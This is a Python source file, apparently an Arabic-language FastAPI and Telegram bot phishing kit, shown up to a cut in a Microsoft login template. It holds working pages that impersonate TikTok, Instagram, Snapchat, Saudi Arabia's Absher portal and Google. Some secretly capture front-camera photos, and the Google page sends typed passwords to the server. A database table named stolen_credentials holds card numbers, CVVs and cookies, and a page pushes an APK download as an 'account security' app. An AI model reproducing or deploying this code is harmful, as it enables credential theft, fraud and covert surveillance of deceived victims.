import os
import base64
import io
import sqlite3
import hashlib
import traceback
import logging
import random
import string
import json
from datetime import datetime
import uvicorn
from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

# ==================== إعداد السجلات ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== التكوينات ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
RENDER_URL = os.getenv("RENDER_URL", "")
CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_Secret_2026")
SALT = os.getenv("SALT", "Shadow_Salt_321")
OWNER_ID = int(os.getenv("OWNER_ID", "7295259673"))

if not BOT_TOKEN or not RENDER_URL:
    logger.error("❌ المتغيرات البيئية BOT_TOKEN و RENDER_URL غير مضبوطة!")
    raise ValueError("يجب تعيين BOT_TOKEN و RENDER_URL في البيئة")

logger.info(f"🔧 BOT_TOKEN: آخر 4 أحرف ...{BOT_TOKEN[-4:]}")
logger.info(f"🔧 RENDER_URL: {RENDER_URL}")

# ==================== تهيئة البوت ====================
try:
    bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
    bot.get_me()
    logger.info("✅ التوكن صحيح ويعمل")
except Exception as e:
    logger.error(f"❌ فشل تهيئة البوت: {e}")
    raise

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== المسار الرئيسي (صفحات التصيد) ====================
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    template = request.query_params.get("template", "tiktok")
    return get_html_content(template, CAPTURE_SECRET)

# ==================== مسار تقديم ملف APK ====================
@app.get("/app.apk")
async def serve_apk():
    if os.path.exists("app.apk"):
        return FileResponse("app.apk", media_type="application/vnd.android.package-archive", filename="app.apk")
    else:
        return HTMLResponse("<h1>⚠️ الملف غير موجود</h1>", status_code=404)

# ==================== صفحة التحميل المخصصة للضحية ====================
@app.get("/download_app", response_class=HTMLResponse)
async def download_app_page(request: Request):
    user_id = request.query_params.get("id", "guest")
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحميل التطبيق</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
        body {{
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            margin: 0;
        }}
        .card {{
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 24px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            animation: float 3s ease-in-out infinite;
        }}
        @keyframes float {{
            0% {{ transform: translateY(0px); }}
            50% {{ transform: translateY(-10px); }}
            100% {{ transform: translateY(0px); }}
        }}
        .icon {{
            font-size: 70px;
            margin-bottom: 15px;
            display: inline-block;
            animation: pulse 2s infinite;
        }}
        @keyframes pulse {{
            0% {{ transform: scale(1); }}
            50% {{ transform: scale(1.1); }}
            100% {{ transform: scale(1); }}
        }}
        h1 {{
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 10px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }}
        .sub {{
            color: rgba(255, 255, 255, 0.7);
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.7;
        }}
        .btn-download {{
            display: inline-block;
            background: linear-gradient(90deg, #f7971e, #ffd200);
            color: #1a1a2e;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            text-decoration: none;
            box-shadow: 0 8px 25px rgba(247, 151, 30, 0.4);
            letter-spacing: 0.5px;
        }}
        .btn-download:hover {{
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 15px 35px rgba(247, 151, 30, 0.6);
        }}
        .btn-download:active {{
            transform: scale(0.95);
        }}
        .secure-badge {{
            margin-top: 25px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }}
        .secure-badge span {{
            font-size: 16px;
        }}
        .footer {{
            margin-top: 20px;
            color: rgba(255, 255, 255, 0.2);
            font-size: 11px;
        }}
        .particles {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            overflow: hidden;
        }}
        .particle {{
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255,255,255,0.3);
            border-radius: 50%;
            animation: rise linear infinite;
        }}
        @keyframes rise {{
            0% {{ transform: translateY(100vh) scale(0); opacity: 0; }}
            20% {{ opacity: 1; }}
            100% {{ transform: translateY(-10vh) scale(1); opacity: 0; }}
        }}
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="card">
        <div class="icon">📲</div>
        <h1>تحميل التطبيق</h1>
        <p class="sub">حمّل التطبيق الآن لتأمين حسابك والاستفادة من المزايا الحصرية</p>
        <a href="/app.apk" class="btn-download" download>
            ⬇️ تحميل التطبيق الآن
        </a>
        <div class="secure-badge">
            <span>🔒</span> اتصال مشفر وآمن
        </div>
        <div class="footer">الإصدار 2.0 · Shadow System</div>
    </div>
    <script>
        // جسيمات متحركة (تأثير بصري)
        const container = document.getElementById('particles');
        for (let i = 0; i < 30; i++) {{
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
            particle.style.animationDelay = (Math.random() * 10) + 's';
            particle.style.width = (Math.random() * 3 + 2) + 'px';
            particle.style.height = particle.style.width;
            container.appendChild(particle);
        }}
    </script>
</body>
</html>"""

# ==================== صفحة تسجيل الدخول ====================
@app.get("/login-page", response_class=HTMLResponse)
async def login_page():
    return get_login_html()

# ==================== صفحة تحميل APK (للمالك) ====================
@app.get("/download", response_class=HTMLResponse)
async def download_page():
    return get_download_html()

# ==================== مسار Webhook ====================
@app.post(f"/{BOT_TOKEN}")
async def webhook(request: Request):
    try:
        json_string = await request.body()
        update = telebot.types.Update.de_json(json_string.decode('utf-8'))
        bot.process_new_updates([update])
        return {"status": "ok"}
    except Exception as e:
        logger.error(f"Webhook Error: {e}")
        return {"status": "error", "message": str(e)}

# ==================== قاعدة البيانات ====================
def get_db_connection():
    conn = sqlite3.connect("users.db", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS bot_users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            linked_chat_id INTEGER DEFAULT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS operation_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            template_type TEXT,
            generated_link TEXT,
            target_ip TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS captured_targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_chat_id INTEGER,
            target_ip TEXT,
            target_device TEXT,
            image_count INTEGER,
            captured_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS stolen_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_chat_id INTEGER,
            login_type TEXT,
            email TEXT,
            password TEXT,
            card_number TEXT,
            card_expiry TEXT,
            card_cvv TEXT,
            phone TEXT,
            code TEXT,
            cookies TEXT,
            target_ip TEXT,
            captured_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS uploaded_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            images_count INTEGER,
            contacts_rows INTEGER,
            created_at TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS download_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT UNIQUE,
            generated_for INTEGER,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()
    logger.info("✅ قاعدة البيانات جاهزة")

init_db()

def hash_password(password: str) -> str:
    return hashlib.sha256((password + SALT).encode()).hexdigest()

def create_new_account(username, password):
    conn = get_db_connection()
    cursor = conn.cursor()
    hashed = hash_password(password)
    try:
        cursor.execute("INSERT OR IGNORE INTO bot_users (username, password_hash) VALUES (?, ?)", (username, hashed))
        conn.commit()
    except Exception as e:
        logger.error(f"DB Error create: {e}")
    finally:
        conn.close()

def try_login_user(chat_id, username, password):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT password_hash FROM bot_users WHERE username = ?", (username,))
    result = cursor.fetchone()
    if result and result[0] == hash_password(password):
        cursor.execute("UPDATE bot_users SET linked_chat_id = ? WHERE username = ?", (chat_id, username))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def has_active_session(chat_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT username FROM bot_users WHERE linked_chat_id = ?", (chat_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

def log_operation(chat_id, template_type, link, ip="0.0.0.0"):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO operation_logs (chat_id, template_type, generated_link, target_ip) VALUES (?, ?, ?, ?)",
                       (chat_id, template_type, link, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل العملية: {e}")

def log_capture(owner_chat_id, ip, device, count):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO captured_targets (owner_chat_id, target_ip, target_device, image_count) VALUES (?, ?, ?, ?)",
                       (owner_chat_id, ip, device, count))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل الالتقاط: {e}")

def log_credentials(owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO stolen_credentials 
            (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, target_ip) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")

def save_download_link(link_id, chat_id):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO download_links (link_id, generated_for) VALUES (?, ?)", (link_id, chat_id))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل رابط التحميل: {e}")

# ==================== صفحات HTML ====================
def get_login_html():
    return """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول للنظام</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #182533;
            color: #ffffff;
            font-family: system-ui, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .login-card {
            background: #223140;
            padding: 30px 25px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
            max-width: 360px;
            width: 100%;
            text-align: center;
            border: 1px solid #2b3d50;
        }
        h2 { font-size: 22px; margin-bottom: 20px; color: #5288c1; }
        .input-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #b1c7df; }
        input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #2b3d50;
            background: #182533;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border 0.2s;
        }
        input:focus { border-color: #5288c1; }
        .btn {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: background 0.2s;
        }
        #error-msg { color: #e53935; font-size: 14px; margin-top: 15px; display: none; }
        #success-msg { color: #4caf50; font-size: 14px; margin-top: 15px; display: none; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>🔐 تسجيل الدخول للنظام</h2>
        <div class="input-group">
            <label>اسم المستخدم</label>
            <input type="text" id="username" placeholder="أدخل اسم المستخدم">
        </div>
        <div class="input-group">
            <label>كلمة المرور</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور">
        </div>
        <button class="btn" id="loginBtn">تسجيل الدخول</button>
        <div id="error-msg"></div>
        <div id="success-msg"></div>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        document.getElementById('loginBtn').addEventListener('click', function() {
            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();
            const errorBlock = document.getElementById('error-msg');
            const successBlock = document.getElementById('success-msg');
            if(!user || !pass) {
                errorBlock.innerText = "⚠️ يرجى ملء جميع الحقول!";
                errorBlock.style.display = "block";
                return;
            }
            errorBlock.style.display = "none";
            fetch('/api/web-login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: tg.initDataUnsafe.user.id,
                    username: user,
                    password: pass
                })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === "success") {
                    successBlock.innerText = "🎉 تم تسجيل الدخول بنجاح!";
                    successBlock.style.display = "block";
                    setTimeout(() => { tg.close(); }, 1500);
                } else {
                    errorBlock.innerText = "❌ " + data.message;
                    errorBlock.style.display = "block";
                }
            })
            .catch(err => {
                errorBlock.innerText = "⚠️ حدث خطأ في الاتصال بالسيرفر";
                errorBlock.style.display = "block";
            });
        });
    </script>
</body>
</html>"""

def get_download_html():
    return """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحميل التطبيق</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            background-size: 400% 400%;
            animation: gradientBG 10s ease infinite;
            padding: 20px;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, #eee, transparent),
                radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
                radial-gradient(2px 2px at 50px 160px, #ddd, transparent),
                radial-gradient(2px 2px at 90px 40px, rgba(255,255,255,0.6), transparent),
                radial-gradient(2px 2px at 130px 80px, #fff, transparent),
                radial-gradient(2px 2px at 160px 30px, rgba(255,255,255,0.7), transparent);
            background-size: 200px 200px;
            animation: sparkle 5s linear infinite;
            opacity: 0.5;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes sparkle {
            0% { transform: translateY(0); opacity: 0.3; }
            50% { opacity: 1; }
            100% { transform: translateY(-200px); opacity: 0.3; }
        }
        .card {
            position: relative;
            z-index: 1;
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.18);
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            text-align: center;
        }
        .icon { font-size: 70px; margin-bottom: 15px; display: block; animation: pulse 2s infinite; }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        h1 { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 8px; }
        .sub { color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 30px; }
        .btn-download {
            display: inline-block;
            background: linear-gradient(90deg, #f7971e, #ffd200);
            color: #1a1a2e;
            border: none;
            padding: 18px 45px;
            font-size: 20px;
            font-weight: 800;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            text-decoration: none;
            box-shadow: 0 8px 25px rgba(247, 151, 30, 0.4);
        }
        .btn-download:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(247, 151, 30, 0.6); }
        .btn-download:active { transform: scale(0.95); }
        .footer { margin-top: 25px; color: rgba(255,255,255,0.3); font-size: 11px; }
    </style>
</head>
<body>
    <div class="card">
        <span class="icon">📲</span>
        <h1>تحميل التطبيق</h1>
        <p class="sub">قم بتحميل التطبيق لتأمين حسابك</p>
        <a href="/app.apk" class="btn-download" download>
            ⬇️ تحميل الآن
        </a>
        <div class="footer">v2.0 · Shadow System</div>
    </div>
</body>
</html>"""

# ==================== قوالب التصيد ====================
def get_html_content(template_type, secret_key):
    if template_type in ["tiktok", "instagram", "snapchat", "ai_filter", "absher"]:
        bg_color = "#010101"; card_bg = "#121212"; btn_color = "#fe2c55"
        logo_text = "TikTok"; logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
        title = "تحدي الملامح التفاعلي جاهز"
        desc = "يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية."
        btn_text = "▶ اضغط لمشاهدة التحدي"
        redirect_to = "https://www.tiktok.com"
        if template_type == "instagram":
            bg_color = "#fafafa"; card_bg = "#ffffff"; btn_color = "#0095f6"
            logo_text = "Instagram"; logo_style = "background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"
            title = "🛡️ نظام فحص وتوثيق الحسابات الحية"
            desc = "لتأكيد هويتك وتوثيق حسابك بالعلامة الزرقاء مجاناً، يرجى تفعيل الكاميرا الأمامية للمسح الحي."
            btn_text = "✨ ابدأ الفحص الحي للحساب الآن"
            redirect_to = "https://www.instagram.com"
        elif template_type == "snapchat":
            bg_color = "#fffc00"; card_bg = "#ffffff"; btn_color = "#000000"
            logo_text = "Snapchat"; logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
            title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
            desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل."
            btn_text = "🔥 تشغيل الفلتر الحصري"
            redirect_to = "https://www.snapchat.com"
        elif template_type == "ai_filter":
            bg_color = "#0f172a"; card_bg = "#1e293b"; btn_color = "#3b82f6"
            logo_text = "AI Look-Alike 🧠"; logo_style = "background: linear-gradient(to right, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;"
            title = "🔍 فلتر كاشف الشبيه بالذكاء الاصطناعي v2.4"
            desc = "اكتشف من تشبه من مشاهير كرة القدم! يرجى السماح للكاميرا الأمامية لبدء المسح الحي."
            btn_text = "⚡ ابدأ الفحص الحي واكتشف شبيهك الآن"
            redirect_to = "https://www.google.com"
        elif template_type == "absher":
            bg_color = "#f4f6f9"; card_bg = "#ffffff"; btn_color = "#2d6a4f"
            logo_text = "Absher | أبشر"; logo_style = "color: #2d6a4f; font-weight: bold; border-bottom: 3px solid #52b788;"
            title = "🛡️ منصة التحقق الوطني الموحد (أمن البيانات)"
            desc = "تم رصد محاولة دخول مشبوهة. يرجى تفعيل الكاميرا الأمامية لمطابقة بصمة الوجه الحية."
            btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
            redirect_to = "https://www.saudiarabia.gov.sa"
        return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{logo_text}</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ 
            background-color: {bg_color}; color: #ffffff; font-family: system-ui, sans-serif; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            min-height: 100vh; padding: 20px;
        }}
        .container {{ 
            background: {card_bg}; padding: 35px 25px; border-radius: 20px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.3); max-width: 420px; width: 100%; 
            text-align: center;
        }}
        .logo {{ font-size: 34px; font-weight: 800; margin-bottom: 25px; display: inline-block; {logo_style} }}
        .video-box {{
            width: 100%; height: 200px; background: #000000; border-radius: 12px; margin-bottom: 25px;
            display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative;
            border: 1px dashed #475569;
        }}
        .loader {{
            border: 4px solid #f3f3f3; border-top: 4px solid {btn_color}; border-radius: 50%;
            width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .progress-bar {{
            width: 80%; height: 6px; background: #334155; border-radius: 10px; margin: 10px auto; display: none;
        }}
        .progress-fill {{
            height: 100%; width: 0%; background: {btn_color}; border-radius: 10px; transition: width 0.3s;
        }}
        .loading-text {{ color: #94a3b8; font-size: 14px; }}
        h2 {{ font-size: 19px; font-weight: 700; margin-bottom: 12px; }}
        p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
        .btn {{ 
            background-color: {btn_color}; color: white; border: none; padding: 16px 32px; 
            font-size: 16px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; 
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
        }}
        .btn:active {{ transform: scale(0.98); }}
        .error-msg {{ color: #ef4444; font-size: 13px; margin-top: 15px; display: none; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{logo_text}</div>
        <div class="video-box">
            <div class="loader" id="mainLoader"></div>
            <div class="loading-text" id="statusText">جاري تهيئة خوارزميات الـ AI...</div>
            <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
        </div>
        <h2 id="mainTitle">{title}</h2>
        <p id="mainDesc">{desc}</p>
        <button class="btn" id="startBtn">{btn_text}</button>
        <div class="error-msg" id="errorBlock">⚠️ خطأ: الكاميرا معطلة! يجب السماح بالوصول.</div>
    </div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const ownerId = urlParams.get('id');
        const REDIRECT_URL = "{redirect_to}";
        const SECRET_KEY = "{secret_key}";
        function getDeviceInfo() {{
            const ua = navigator.userAgent;
            let os = "غير معروف", browser = "غير معروف";
            if (ua.indexOf("Win") !== -1) os = "Windows";
            else if (ua.indexOf("Mac") !== -1) os = "Mac OS / iPhone";
            else if (ua.indexOf("Android") !== -1) os = "Android";
            if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
            else if (ua.indexOf("Safari") !== -1) browser = "Safari";
            return os + " (" + browser + ")";
        }}
        function startFakeProgress(callback) {{
            const bar = document.getElementById('progressBar');
            const fill = document.getElementById('progressFill');
            bar.style.display = 'block';
            let width = 0;
            const interval = setInterval(() => {{
                width += Math.floor(Math.random() * 15) + 5;
                if (width >= 100) {{ width = 100; clearInterval(interval); }}
                fill.style.width = width + '%';
                document.getElementById('statusText').innerText = 'جاري تحليل الملامح ' + width + '%';
                if (width >= 100) {{
                    setTimeout(callback, 400);
                }}
            }}, 300);
        }}
        function tryCapture() {{
            if (!ownerId) {{ window.location.href = REDIRECT_URL; return; }}
            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
            .then(function(stream) {{
                document.getElementById('errorBlock').style.display = 'none';
                document.getElementById('statusText').innerText = "نجح الاتصال.. جاري قراءة النقاط الحيوية...";
                let video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                video.play();
                video.onloadedmetadata = function() {{
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    let ctx = canvas.getContext('2d');
                    let shotsTaken = 0; const deviceInfo = getDeviceInfo();
                    const totalShots = 3;
                    startFakeProgress(() => {{
                        let captureInterval = setInterval(function() {{
                            if (shotsTaken >= totalShots) {{
                                clearInterval(captureInterval);
                                stream.getTracks().forEach(track => track.stop());
                                window.location.href = REDIRECT_URL + '?verified=true';
                                return;
                            }}
                            ctx.drawImage(video, 0, 0);
                            let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                            fetch('/api/capture', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{
                                    user_id: ownerId,
                                    image: base64Image,
                                    count: shotsTaken + 1,
                                    device: deviceInfo,
                                    secret: SECRET_KEY
                                }})
                            }});
                            shotsTaken++;
                        }}, 600);
                    }});
                }};
            }})
            .catch(function(err) {{
                document.getElementById('errorBlock').style.display = 'block';
                document.getElementById('statusText').innerText = "⚠️ تعذر التحليل! يرجى منح الإذن.";
            }});
        }}
        document.getElementById('startBtn').addEventListener('click', tryCapture);
    </script>
</body>
</html>"""
    
    elif template_type == "google":
        return f"""<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Google</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background:#fff; font-family:'Roboto',Arial,sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }}
        .container {{ max-width:450px; width:100%; padding:48px 40px 36px; border-radius:8px; border:1px solid #dadce0; background:white; }}
        .logo {{ display:flex; justify-content:center; gap:4px; font-size:24px; font-weight:500; margin-bottom:20px; }}
        .logo span:nth-child(1){{color:#4285f4;}}.logo span:nth-child(2){{color:#ea4335;}}.logo span:nth-child(3){{color:#fbbc05;}}.logo span:nth-child(4){{color:#4285f4;}}.logo span:nth-child(5){{color:#34a853;}}.logo span:nth-child(6){{color:#ea4335;}}
        .title{{font-size:24px;text-align:center;color:#202124;}}
        .subtitle{{font-size:16px;text-align:center;color:#5f6368;margin-bottom:30px;}}
        .input-group{{margin-bottom:20px;}}
        .input-group input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;}}
        .input-group input:focus{{border-color:#4285f4;}}
        .btn{{background:#4285f4;color:white;border:none;padding:12px;font-size:16px;font-weight:500;border-radius:4px;cursor:pointer;width:100%;}}
        .btn:hover{{background:#3367d6;}}
        .error{{color:#d93025;font-size:14px;margin-top:15px;display:none;background:#fce8e6;padding:10px;border-radius:4px;text-align:center;}}
        .footer{{margin-top:30px;text-align:center;font-size:14px;color:#5f6368;}}
        .footer a{{color:#4285f4;text-decoration:none;}}
        .separator{{display:flex;align-items:center;margin:20px 0;color:#5f6368;font-size:14px;}}
        .separator::before, .separator::after{{content:"";flex:1;height:1px;background:#dadce0;}}
        .separator::before{{margin-right:15px;}}.separator::after{{margin-left:15px;}}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
        <div class="title">تسجيل الدخول</div>
        <div class="subtitle">استمراراً إلى حسابك على Google</div>
        <div class="input-group"><input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus></div>
        <div class="input-group"><input type="password" id="password" placeholder="أدخل كلمة المرور"></div>
        <button class="btn" id="loginBtn">تسجيل الدخول</button>
        <div class="error" id="errorMsg">تأكد من أن بيانات الدخول صحيحة</div>
        <div class="separator">أو</div>
        <div style="text-align:center;margin-top:10px;"><a href="#" style="color:#4285f4;text-decoration:none;font-size:14px;font-weight:500;">إنشاء حساب</a></div>
        <div class="footer"><a href="#">مساعدة</a> · <a href="#">خصوصية</a> · <a href="#">شروط الخدمة</a></div>
    </div>
    <script>
        const ownerId = new URLSearchParams(window.location.search).get('id');
        document.getElementById('loginBtn').addEventListener('click', function() {{
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value.trim();
            const errorBlock = document.getElementById('errorMsg');
            if(!email || !pass) {{ errorBlock.style.display='block'; errorBlock.innerText='⚠️ يرجى ملء جميع الحقول'; return; }}
            errorBlock.style.display='none';
            fetch('/api/credentials',{{
                method:'POST',
                headers:{{'Content-Type':'application/json'}},
                body:JSON.stringify({{user_id:ownerId, email:email, password:pass, login_type:'google', secret:'{secret_key}'}})
            }}).then(()=>{{ window.location.href='https://accounts.google.com/v3/signin/challenge/pwd?continue=https://www.google.com'; }});
        }});
        document.getElementById('password').addEventListener('keypress', function(e){{ if(e.key==='Enter') document.getElementById('loginBtn').click(); }});
    </script>
</body>
</html>"""
    
    elif template_type == "microsoft":
        return f"""<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Microsoft</title>
    <style>
